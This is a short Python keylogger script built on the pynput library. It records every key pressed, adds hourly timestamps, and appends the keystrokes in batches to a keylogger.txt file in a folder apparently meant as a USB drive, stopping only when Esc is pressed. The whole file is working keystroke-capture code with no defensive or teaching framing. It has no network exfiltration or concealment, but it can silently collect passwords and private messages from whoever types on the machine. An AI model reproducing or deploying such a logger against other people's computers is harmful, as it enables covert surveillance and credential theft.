from pynput.keyboard import Key, Listener
from datetime import datetime, timedelta
import os

# Find the path to the USB drive dynamically
usb_path = os.path.join(os.path.expanduser("~"), "usb_drive")
log_file = os.path.join(usb_path, "keylogger.txt")

# Ensure the directory exists
os.makedirs(usb_path, exist_ok=True)

# Variables to track key press count and store key events
count = 0
keys = []
last_timestamp = datetime.now()

# Initialize the log file with a timestamp
with open(log_file, "a") as f:
    f.write(f"Timestamp: {last_timestamp.strftime('%Y-%m-%d %H:%M:%S')}\n")
    f.write("\n")

def on_press(key):
    global count, keys, last_timestamp
    current_timestamp = datetime.now()
    keys.append((key, current_timestamp))
    count += 1
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []
    # Log the timestamp every hour
    if current_timestamp - last_timestamp >= timedelta(hours=1):
        with open(log_file, "a") as f:
            f.write(f"\nTimestamp: {current_timestamp.strftime('%Y-%m-%d %H:%M:%S')}\n")
            last_timestamp = current_timestamp

def on_release(key):
    if key == Key.esc:
        return False

def write_file(keys):
    with open(log_file, "a") as f:
        paragraph = ""
        for key, timestamp in keys:
            k = str(key).replace("'", "")
            if k == 'Key.space':
                k = " "
            elif k == 'Key.enter':
                k = "[ENTER]"
            elif k == 'Key.backspace':
                k = "[BACKSPACE]"
            elif k == 'Key.tab':
                k = "[TAB]"
            elif k == 'Key.shift':
                continue
            elif k == 'Key.up':
                k = "[UP]"
            elif k == 'Key.down':
                k = "[DOWN]"
            elif k == 'Key.left':
                k = "[LEFT]"
            elif k == 'Key.right':
                k = "[RIGHT]"
            elif k == 'Key.esc':
                k = "[ESC]"
            else:
                k = k.replace("'", "")

            paragraph += k
            if len(paragraph.replace(" ", "")) >= 14:  # Count only non-space characters
                f.write(paragraph + "\n")
                paragraph = ""

        if paragraph:
            f.write(paragraph + "\n")

if __name__ == "__main__":
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

    with open(log_file, "a") as f:
        f.write("\n\n")
        f.write("------------------------------------------------------------------------------\n\n")
